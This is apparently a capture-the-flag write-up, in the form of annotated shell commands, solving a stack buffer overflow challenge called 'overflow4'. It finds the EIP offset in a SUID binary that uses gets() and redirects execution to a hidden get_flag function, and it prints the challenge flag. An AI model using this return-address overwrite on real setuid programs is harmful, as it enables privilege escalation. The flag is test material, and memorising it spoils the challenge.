@@ -1,0 +1,54 @@
+# Lets look around
+ls -lart
+
+# Ok, so the flag is root readable, but overflow4 is a SUID binary
+cat overflow4.c
+# gets() will take any length input, buffer overflow
+# The get_flag() function still exists but is never called, we have to use
+# the gets() overflow to modify EIP directly
+
+# How secure is the binary?
+./checksec.sh --file overflow4
+# Not secure at all, awesome
+
+# First step of any buffer overlow is to crash it
+# run with a bunch of A's, see a crash
+python -c "print 'A'*300" > a
+./overflow4 < a 
+Try again
+Segmentation fault (core dumped)
+
+# Use pattern to find the offset of modify_me
+./pattern create 300 > a
+gdb ./overflow4
+r < a
+Program received signal SIGSEGV, Segmentation fault.
+0x41396941 in ?? ()
+
+# Lookup the offset
+./pattern offset 0x41396941
+267
+
+# Ok, we have the offset to modify eip, lets test
+python -c 'print "A"*267 + "\xef\xbe\xad\xde"' > a
+
+gdb ./overflow4
+r < a
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+
+# We control EIP, where do we want to jump?
+gdb ./overflow4
+disas get_flag
+0x0804853b <+0>: push   ebp
+
+# Edit our overflow to jump to get_flag (little endian)
+python -c 'print "A"*267 + "\x3b\x85\x04\x08"' > a
+./overflow4 < a
+Try again
+acsc2017{eip_is_all_you_need}
+Segmentation fault (core dumped)
+
+
+
+
